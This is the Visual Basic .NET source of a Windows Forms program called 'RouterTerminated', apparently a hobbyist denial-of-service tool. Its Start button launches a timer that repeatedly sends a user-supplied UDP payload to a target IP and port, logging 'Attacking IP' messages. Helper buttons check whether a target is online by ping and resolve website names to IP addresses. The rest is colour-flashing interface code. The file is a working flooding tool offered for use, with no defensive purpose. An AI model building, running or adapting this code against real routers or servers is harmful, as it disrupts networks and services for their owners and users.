Imports System.Net
Imports System.Text
Imports System.Net.Sockets
Imports System.Diagnostics
Public Class RouterTerminated
    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click
        Timer1.Start()
        MsgBox("Attack Started", MsgBoxStyle.Exclamation, Title:="Started")


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try

            ListBox1.Items.Add("attackig " + TextBox1.Text + " with data ")
            Dim udpClient As New UdpClient
            Dim GLOIP As IPAddress
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(TextBox1.Text)
            udpClient.Connect(GLOIP, TextBox2.Text)
            bytCommand = Encoding.ASCII.GetBytes(TextBox3.Text)
            udpClient.Send(bytCommand, bytCommand.Length)
            ListBox1.Items.Add("Attacking IP: " & TextBox1.Text & " with Terminator")




        Catch ex As Exception
            Timer1.Stop()
            MsgBox("Wrong IP/Port", MsgBoxStyle.Critical, Title:="WRONG IP OR PORT")
        End Try

    End Sub

    Private Sub Abort_Click(sender As Object, e As EventArgs) Handles Abort.Click
        Timer1.Stop()
        MsgBox("ATTACK STOPPED SUCCESSFULLY", MsgBoxStyle.Information, Title:="ATTACK STOPPED")
    End Sub

    Private Sub Clear_Click(sender As Object, e As EventArgs) Handles Clear.Click
        TextBox1.Text = ""
        TextBox2.Text = ""
        TextBox3.Text = ""
        ListBox1.Text = ""

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim ip As String
        ip = TextBox4.Text
        If My.Computer.Network.Ping(ip) Then
            Label5.ForeColor = Color.Lime
            Label5.Text = "ONLINE"
        Else
            Label5.ForeColor = Color.Red
            Label5.Text = "OFFLINE"

        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Dim strHostName As String

        Dim strIPAddress As String



        strHostName = System.Net.Dns.GetHostName()

        strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()
        Label6.Text = (strIPAddress)
    End Sub

    Private Sub TextBox1_Click(sender As Object, e As EventArgs) Handles TextBox1.Click
        TextBox1.Clear()
    End Sub

    Private Sub TextBox2_Click(sender As Object, e As EventArgs) Handles TextBox2.Click
        TextBox2.Clear()
    End Sub

    Private Sub TextBox3_Click(sender As Object, e As EventArgs) Handles TextBox3.Click
        TextBox3.Clear()
    End Sub

    Private Sub TextBox4_Click(sender As Object, e As EventArgs) Handles TextBox4.Click
        TextBox4.Clear()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim hostname As IPHostEntry = Dns.GetHostByName(TextBox5.Text)
        Dim ip As IPAddress() = hostname.AddressList
        If TextBox5.Text = ("") Then
            MsgBox("Please Enter Website Name!", MsgBoxStyle.Exclamation)
        End If
        TextBox6.Text = ip(0).ToString
        TextBox6.Enabled = True
    End Sub

    Private Sub TextBox5_Click(sender As Object, e As EventArgs) Handles TextBox5.Click
        TextBox5.Clear()
    End Sub

    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Start()

        If Label10.ForeColor = Color.Lime Then
            Label10.ForeColor = Color.Red
        ElseIf Label10.ForeColor = Color.Red Then
            Label10.ForeColor = Color.Aqua
        ElseIf Label10.ForeColor = Color.Aqua Then
            Label10.ForeColor = Color.Orange
        ElseIf Label10.ForeColor = Color.Orange Then
            Label10.ForeColor = Color.BlueViolet
        ElseIf Label10.ForeColor = Color.BlueViolet Then
            Label10.ForeColor = Color.Gold
        ElseIf Label10.ForeColor = Color.Gold Then
            Label10.ForeColor = Color.Maroon
        ElseIf Label10.ForeColor = Color.Maroon Then
            Label10.ForeColor = Color.Lime
        End If

    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Timer3.Start()

        If Label6.ForeColor = Color.Lime Then
            Label6.ForeColor = Color.Red
        ElseIf Label6.ForeColor = Color.Red Then
            Label6.ForeColor = Color.Aqua
        ElseIf Label6.ForeColor = Color.Aqua Then
            Label6.ForeColor = Color.Orange
        ElseIf Label6.ForeColor = Color.Orange Then
            Label6.ForeColor = Color.BlueViolet
        ElseIf Label6.ForeColor = Color.BlueViolet Then
            Label6.ForeColor = Color.Gold
        ElseIf Label6.ForeColor = Color.Gold Then
            Label6.ForeColor = Color.Maroon
        ElseIf Label6.ForeColor = Color.Maroon Then
            Label6.ForeColor = Color.Lime
        End If
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Timer2.Start()

        If Title.ForeColor = Color.Lime Then
            Title.ForeColor = Color.Red
        ElseIf title.ForeColor = Color.Red Then
            Title.ForeColor = Color.Aqua
        ElseIf title.ForeColor = Color.Aqua Then
            Title.ForeColor = Color.Orange
        ElseIf title.ForeColor = Color.Orange Then
            Title.ForeColor = Color.BlueViolet
        ElseIf title.ForeColor = Color.BlueViolet Then
            Title.ForeColor = Color.Gold
        ElseIf title.ForeColor = Color.Gold Then
            Title.ForeColor = Color.Maroon
        ElseIf title.ForeColor = Color.Maroon Then
            Title.ForeColor = Color.Lime
        End If
    End Sub

    Private Sub OnToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OnToolStripMenuItem.Click
        Timer2.Start()
        Timer3.Start()
        Timer4.Start()
        MsgBox("Flashing Started", MsgBoxStyle.Information, Title:="started")
    End Sub

    Private Sub OffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OffToolStripMenuItem.Click
        Timer2.Stop()
        Timer3.Stop()
        Timer4.Stop()
        MsgBox("Flashing Stopped", MsgBoxStyle.Information, Title:="stopped")
    End Sub

    Private Sub TitleFlashOffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TitleFlashOffToolStripMenuItem.Click
        Timer2.Stop()
    End Sub

    Private Sub WelcomeFlashOffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WelcomeFlashOffToolStripMenuItem.Click
        Timer3.Stop()
    End Sub
End Class